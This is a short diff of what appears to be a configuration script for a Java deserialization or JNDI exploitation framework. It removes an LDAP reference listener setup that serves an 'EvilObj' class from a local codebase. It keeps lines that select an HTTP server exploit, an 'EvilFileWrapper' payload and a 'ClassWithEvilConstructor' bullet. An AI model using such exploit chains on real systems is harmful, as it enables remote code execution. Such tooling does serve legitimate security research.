@@ -1,9 +1,3 @@
-use exploit LDAPRefListener
-set lport 8888
-set codebase http://localhost:8081/
-set objectName EvilObj
-run
-
 use exploit SimpleHTTPServer
 use payload EvilFileWrapper
 use bullet ClassWithEvilConstructor
